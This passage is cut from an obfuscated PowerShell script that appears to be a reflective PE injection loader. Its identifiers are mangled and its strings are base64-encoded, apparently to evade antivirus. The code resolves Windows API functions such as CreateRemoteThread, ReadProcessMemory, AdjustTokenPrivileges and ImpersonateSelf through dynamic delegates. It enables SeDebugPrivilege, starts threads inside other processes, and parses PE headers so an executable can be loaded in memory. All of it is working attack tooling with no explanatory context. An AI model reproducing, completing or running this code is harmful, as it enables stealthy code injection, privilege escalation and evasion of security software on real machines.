		$Win32Func | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${__/\/=\/\_/=\_/==}
		${_/\_/\_/\__/===\/} = ____/\___/\__/=\/= kernel32.dll CreateRemoteThread
        ${_/=\/=\/=\/\/\_/\} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${_/=\___/\/\/=\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\_/\__/===\/}, ${_/=\/=\/=\/\/\_/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${_/=\___/\/\/=\_/=}
		${___/\__/\__/==\__} = ____/\___/\__/=\/= kernel32.dll GetExitCodeThread
        ${__/\_/==\__/==\/=} = __/\/==\__/=\/===\ @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${_/=\/\_/=\/\/=\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\__/\__/==\__}, ${__/\_/==\__/==\/=})
		$Win32Func | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${_/=\/\_/=\/\/=\/\}
		${__/===\_/\/=\/===} = ____/\___/\__/=\/= Advapi32.dll OpenThreadToken
        ${/=====\/\/=\__/==} = __/\/==\__/=\/===\ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${/=\_/\/=\_/===\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/===\_/\/=\/===}, ${/=====\/\/=\__/==})
		$Win32Func | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${/=\_/\/=\_/===\_/}
		${/==\__/\_/====\_/} = ____/\___/\__/=\/= kernel32.dll GetCurrentThread
        ${/==\/==\__/\/\_/\} = __/\/==\__/=\/===\ @() ([IntPtr])
        ${__/=\/\__/\_/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\__/\_/====\_/}, ${/==\/==\__/\/\_/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${__/=\/\__/\_/==\_}
		${_/\/=\/=\/\/\____} = ____/\___/\__/=\/= Advapi32.dll AdjustTokenPrivileges
        ${/=\__/\__/\/\/\/\} = __/\/==\__/=\/===\ @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${_/\/\__/=\__/\/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/=\/=\/\/\____}, ${/=\__/\__/\/\/\/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${_/\/\__/=\__/\/\_}
		${/=\__/======\/===} = ____/\___/\__/=\/= Advapi32.dll LookupPrivilegeValueA
        ${__/\____/=\/===\_} = __/\/==\__/=\/===\ @([String], [String], [IntPtr]) ([Bool])
        ${_/==\/======\___/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/======\/===}, ${__/\____/=\/===\_})
		$Win32Func | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${_/==\/======\___/}
		${_/===\/=\/\/\_/=\} = ____/\___/\__/=\/= Advapi32.dll ImpersonateSelf
        ${_/=\__/\___/=====} = __/\/==\__/=\/===\ @([Int32]) ([Bool])
        ${_/=\_____/\_/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/=\/\/\_/=\}, ${_/=\__/\___/=====})
		$Win32Func | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${_/=\_____/\_/==\_}
		${_/===\/=\/\_/\_/=} = ____/\___/\__/=\/= Kernel32.dll IsWow64Process
        ${_/==\/\______/\/\} = __/\/==\__/=\/===\ @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${____/======\/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/=\/\_/\_/=}, ${_/==\/\______/\/\})
		$Win32Func | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${____/======\/==\_}
		${_/\/==\/=\__/==\/} = ____/\___/\__/=\/= Kernel32.dll CreateThread
        ${_/\_/\_/\___/\/\/} = __/\/==\__/=\/===\ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${_/==\_/=\/===\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/==\/=\__/==\/}, ${_/\_/\_/\___/\/\/})
		$Win32Func | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${_/==\_/=\/===\__/}
		${/==\/\/==\___/=\_} = ____/\___/\__/=\/= kernel32.dll VirtualFree
		${/=\/=\/\_/=\_/\/\} = __/\/==\__/=\/===\ @([IntPtr])
		${_/====\/=\/=\_/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/\/==\___/=\_}, ${/=\/=\/\_/=\_/\/\})
		$Win32Func | Add-Member NoteProperty -Name LocalFree -Value ${_/====\/=\/=\_/\/}
		return $Win32Func
	}
	Function _____/\___/\__/\_/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=====\/=====\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/==\__/===\____/}
		)
		[Byte[]]${_/==\/==\/\___/==} = [BitConverter]::GetBytes(${__/\/=====\/=====\})
		[Byte[]]${_/==\/=\__/====\_} = [BitConverter]::GetBytes(${__/==\__/===\____/})
		[Byte[]]${__/\/\_/==\_/====} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/==\/==\/\___/==}.Count -eq ${_/==\/=\__/====\_}.Count)
		{
			${___/\__/=\/\/=\/\} = 0
			for (${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${_/==\/==\/\___/==}.Count; ${/=\__/=\/\_/=\__/}++)
			{
				${/=\___/=\_/\/====} = ${_/==\/==\/\___/==}[${/=\__/=\/\_/=\__/}] - ${___/\__/=\/\/=\/\}
				if (${/=\___/=\_/\/====} -lt ${_/==\/=\__/====\_}[${/=\__/=\/\_/=\__/}])
				{
					${/=\___/=\_/\/====} += 256
					${___/\__/=\/\/=\/\} = 1
				}
				else
				{
					${___/\__/=\/\/=\/\} = 0
				}
				[UInt16]${_/=\/===\/\___/\/} = ${/=\___/=\_/\/====} - ${_/==\/=\__/====\_}[${/=\__/=\/\_/=\__/}]
				${__/\/\_/==\_/====}[${/=\__/=\/\_/=\__/}] = ${_/=\/===\/\___/\/} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${__/\/\_/==\_/====}, 0)
	}
	Function __/\______/=\___/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=====\/=====\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/==\__/===\____/}
		)
		[Byte[]]${_/==\/==\/\___/==} = [BitConverter]::GetBytes(${__/\/=====\/=====\})
		[Byte[]]${_/==\/=\__/====\_} = [BitConverter]::GetBytes(${__/==\__/===\____/})
		[Byte[]]${__/\/\_/==\_/====} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/==\/==\/\___/==}.Count -eq ${_/==\/=\__/====\_}.Count)
		{
			${___/\__/=\/\/=\/\} = 0
			for (${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${_/==\/==\/\___/==}.Count; ${/=\__/=\/\_/=\__/}++)
			{
				[UInt16]${_/=\/===\/\___/\/} = ${_/==\/==\/\___/==}[${/=\__/=\/\_/=\__/}] + ${_/==\/=\__/====\_}[${/=\__/=\/\_/=\__/}] + ${___/\__/=\/\/=\/\}
				${__/\/\_/==\_/====}[${/=\__/=\/\_/=\__/}] = ${_/=\/===\/\___/\/} -band 0x00FF
				if ((${_/=\/===\/\___/\/} -band 0xFF00) -eq 0x100)
				{
					${___/\__/=\/\/=\/\} = 1
				}
				else
				{
					${___/\__/=\/\/=\/\} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${__/\/\_/==\_/====}, 0)
	}
	Function ___/\___/\_/==\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\/=====\/=====\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/==\__/===\____/}
		)
		[Byte[]]${_/==\/==\/\___/==} = [BitConverter]::GetBytes(${__/\/=====\/=====\})
		[Byte[]]${_/==\/=\__/====\_} = [BitConverter]::GetBytes(${__/==\__/===\____/})
		if (${_/==\/==\/\___/==}.Count -eq ${_/==\/=\__/====\_}.Count)
		{
			for (${/=\__/=\/\_/=\__/} = ${_/==\/==\/\___/==}.Count-1; ${/=\__/=\/\_/=\__/} -ge 0; ${/=\__/=\/\_/=\__/}--)
			{
				if (${_/==\/==\/\___/==}[${/=\__/=\/\_/=\__/}] -gt ${_/==\/=\__/====\_}[${/=\__/=\/\_/=\__/}])
				{
					return $true
				}
				elseif (${_/==\/==\/\___/==}[${/=\__/=\/\_/=\__/}] -lt ${_/==\/=\__/====\_}[${/=\__/=\/\_/=\__/}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${__/\__/======\___} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${__/\__/======\___}, 0))
	}
	Function _/===\_/\/=\/=\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${_/===\/=\/==\/===\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\/==\_/\_/\_/=\},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${__/\/=\____/==\/\/}
		)
	    [IntPtr]${/=\/=\/\/=\_/\___} = [IntPtr](__/\______/=\___/\ (${__/\/==\_/\_/\_/=\}) (${__/\/=\____/==\/\/}))
		${_/=\____/\_/=\_/=} = ${__/\___/===\/\/=\/}.EndAddress
		if ((___/\___/\_/==\_/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\/==\_/\_/\_/=\})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAEQAZQBiAHUAZwBTAHQAcgBpAG4AZwA=')))
		}
		if ((___/\___/\_/==\_/\ (${/=\/=\/\/=\_/\___}) (${_/=\____/\_/=\_/=})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAEQAZQBiAHUAZwBTAHQAcgBpAG4AZwA=')))
		}
	}
	Function ___/===\_/\/=\__/\
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${_/====\____/\___/\},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${____/\/====\__/==\}
		)
		for (${_/\_/\__/\_/\/\_/} = 0; ${_/\_/\__/\_/\/\_/} -lt ${_/====\____/\___/\}.Length; ${_/\_/\__/\_/\/\_/}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${____/\/====\__/==\}, ${_/\_/\__/\_/\/\_/}, ${_/====\____/\___/\}[${_/\_/\__/\_/\/\_/}])
		}
	}
	Function __/\/==\__/=\/===\
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${____/=\/=\_/\_/=\_} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${__/=\/=\___/====\/} = [Void]
	    )
	    ${_/\/\__/\/\/=\/\_} = [AppDomain]::CurrentDomain
	    ${_/=\_/==\/\/=====} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${___/=\___/\_/\_/\} = ${_/\/\__/\/\/=\/\_}.DefineDynamicAssembly(${_/=\_/==\/\/=====}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${__/=\/==\___/\_/\} = ${___/=\___/\_/\_/\}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${/==\/\/===\__/\_/} = ${____/\/\_/\__/===}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${____/=\/=\_/\_/=\_})
	    ${/==\/\/===\__/\_/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${_/=\_/\/=\/=\/===} = ${____/\/\_/\__/===}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${__/=\/=\___/====\/}, ${____/=\/=\_/\_/=\_})
	    ${_/=\_/\/=\/=\/===}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${____/\/\_/\__/===}.CreateType()
	}
	Function ____/\___/\__/=\/=
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_/==\_/\/=\_/=====},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${_/=\/==\/=\/==\___}
	    )
	    ${____/\_/=\/\/=\/=} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${_/\/=\__/==\__/\_} = ${____/\_/=\/\/=\/=}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${_/=\/\__/=\/====\} = ${_/\/=\__/==\__/\_}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${_/\_/\_____/=\/\/} = ${_/\/=\__/==\__/\_}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAA=='))))
	    ${__/=\____/=\__/=\} = ${_/=\/\__/=\/====\}.Invoke($null, @(${_/==\_/\/=\_/=====}))
	    ${_/\/\/\_/===\_/=\} = New-Object IntPtr
	    ${_/\/\_/==\/=\____} = New-Object System.Runtime.InteropServices.HandleRef(${_/\/\/\_/===\_/=\}, ${__/=\____/=\__/=\})
	    echo ${_/\_/\_____/=\/\/}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${_/\/\_/==\/=\____}, ${_/=\/==\/=\/==\___}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Const
		)
		[IntPtr]${_____/\/\/\___/==} = $Win32Func.GetCurrentThread.Invoke()
		if (${_____/\/\/\___/==} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${_/\_/=\_/\___/=\_} = [IntPtr]::Zero
		[Bool]${__/=\/==\____/\/\} = $Win32Func.OpenThreadToken.Invoke(${_____/\/\/\___/==}, $Win32Const.TOKEN_QUERY -bor $Win32Const.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${_/\_/=\_/\___/=\_})
		if (${__/=\/==\____/\/\} -eq $false)
		{
			${/=\_/\/=\_/===\/\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${/=\_/\/=\_/===\/\} -eq $Win32Const.ERROR_NO_TOKEN)
			{
				${__/=\/==\____/\/\} = $Win32Func.ImpersonateSelf.Invoke(3)
				if (${__/=\/==\____/\/\} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${__/=\/==\____/\/\} = $Win32Func.OpenThreadToken.Invoke(${_____/\/\/\___/==}, $Win32Const.TOKEN_QUERY -bor $Win32Const.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${_/\_/=\_/\___/=\_})
				if (${__/=\/==\____/\/\} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AF8AXwBfAC8AXAAvAFwALwA9AFwALwA9AD0AXABfAF8ALwB9AA==')))
			}
		}
		[IntPtr]${_/\_/====\/=\____} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${__/=\/==\____/\/\} = $Win32Func.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${_/\_/====\/=\____})
		if (${__/=\/==\____/\/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${_/\/\_/\__/=\/===} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${__/==\_/=\/===\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/\__/=\/===})
		${__/===\/=\/=\/\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/==\_/=\/===\/=}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${__/===\/=\/=\/\__}.PrivilegeCount = 1
		${__/===\/=\/=\/\__}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\_/====\/=\____}, [Type]$Win32Types.LUID)
		${__/===\/=\/=\/\__}.Privileges.Attributes = $Win32Const.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/===\/=\/=\/\__}, ${__/==\_/=\/===\/=}, $true)
		${__/=\/==\____/\/\} = $Win32Func.AdjustTokenPrivileges.Invoke(${_/\_/=\_/\___/=\_}, $false, ${__/==\_/=\/===\/=}, ${_/\/\_/\__/=\/===}, [IntPtr]::Zero, [IntPtr]::Zero)
		${/=\_/\/=\_/===\/\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${__/=\/==\____/\/\} -eq $false) -or (${/=\_/\/=\_/===\/\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/==\_/=\/===\/=})
	}
	Function ____/\_/\_/\__/\__
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${__/==\_/\__/\_/=\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\/==\_/\_/\_/=\},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${__/========\/\/\__} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Func
		)
		[IntPtr]${_/===\/\/=\/\/==\} = [IntPtr]::Zero
		${____/=\_____/==\_} = [Environment]::OSVersion.Version
		if (${____/=\_____/==\_}.Major -eq 5 -and ${____/=\_____/==\_}.Minor -eq 1)
		{
			${_/===\/\/=\/\/==\} = $Win32Func.CreateThread.Invoke([IntPtr]::Zero, 0, ${__/\/==\_/\_/\_/=\}, ${__/========\/\/\__}, 0, [IntPtr]::Zero)
		}
		else
		{
			${_/===\/\/=\/\/==\} = $Win32Func.CreateRemoteThread.Invoke(${__/==\_/\__/\_/=\_}, [IntPtr]::Zero, 0, ${__/\/==\_/\_/\_/=\}, ${__/========\/\/\__}, 0, [IntPtr]::Zero)
		}
		return ${_/===\/\/=\/\/==\}
	}
	Function ___/\__/\/==\_/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\___/\__/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${__/==\____/=\/\/=} = New-Object System.Object
		${/=\/==\/=\/\/\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/====\___/\__/=\/}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${/=\_____/\_/\__/\} = [IntPtr](__/\______/=\___/\ ([Int64]${_/====\___/\__/=\/}) ([Int64][UInt64]${/=\/==\/=\/\/\/\/}.e_lfanew))
		${__/==\____/=\/\/=} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${/=\_____/\_/\__/\}
		${_____/\/\/\/=====} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_____/\_/\__/\}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${_____/\/\/\/=====}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${_____/\/\/\/=====}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${__/==\____/=\/\/=} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${_____/\/\/\/=====}
			${__/==\____/=\/\/=} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${___/=\__/\/======} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_____/\_/\__/\}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${__/==\____/=\/\/=} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${___/=\__/\/======}
			${__/==\____/=\/\/=} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${__/==\____/=\/\/=}
	}
	Function __/=\_____/======\
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_____/=\___/=\/\/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${__/\___/===\/\/=\/} = New-Object System.Object
		[IntPtr]${_/=\__/\/=====\_/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_____/=\___/=\/\/=}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${_____/=\___/=\/\/=}, 0, ${_/=\__/\/=====\_/}, ${_____/=\___/=\/\/=}.Length) | Out-Null
		${__/==\____/=\/\/=} = ___/\__/\/==\_/=== -_/====\___/\__/=\/ ${_/=\__/\/=====\_/} -Win32Types $Win32Types
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${__/==\____/=\/\/=}.PE64Bit)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/=\__/\/=====\_/})
		return ${__/\___/===\/\/=\/}
	}
	Function _/==\/\_/\/\_/\_/=
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\___/\__/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Const
		)
		if (${_/====\___/\__/=\/} -eq $null -or ${_/====\___/\__/=\/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${__/\___/===\/\/=\/}= New-Object System.Object
		${__/==\____/=\/\/=} = ___/\__/\/==\_/=== -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -Win32Types $Win32Types
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${_/====\___/\__/=\/}
